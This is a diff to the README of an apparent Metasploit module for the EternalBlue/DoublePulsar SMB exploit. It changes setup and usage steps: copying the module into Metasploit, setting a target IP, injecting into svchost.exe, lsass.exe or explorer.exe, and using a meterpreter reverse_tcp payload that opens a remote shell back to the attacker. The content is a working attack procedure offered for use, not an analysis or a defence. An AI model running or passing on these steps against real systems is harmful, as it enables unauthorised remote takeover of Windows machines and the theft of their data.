@@ -6,7 +6,9 @@
 - git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
 - cd Eternalblue-Doublepulsar-Metasploit
 - cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
-* Note: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb
+
+* Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb
+
 - mkdir -p /root/.wine/drive_c/
 
 # How to use
@@ -21,7 +23,7 @@
  * For Windows x64 
 
 -  RHOST (Target IP)
- - set PROCESSINJECT svchost.exe or et PROCESSINJECT svchost.exe
+ - set PROCESSINJECT svchost.exe or set PROCESSINJECT lsass.exe
  - set TARGETARCHITECTURE x64
  - set payload windows/x64/meterpreter/reverse_tcp
  - set LHOST (Local IP, check it with 'ip a')
@@ -32,7 +34,7 @@
  * For Windows x86
 
  - set RHOST (Target IP)
- - set PROCESSINJECT svchost.exe or et PROCESSINJECT explorer.exe
+ - set PROCESSINJECT svchost.exe or set PROCESSINJECT explorer.exe
  - set TARGETARCHITECTURE x86
  - set payload windows/meterpreter/reverse_tcp
  - set LHOST (Local IP, check it with 'ip a')
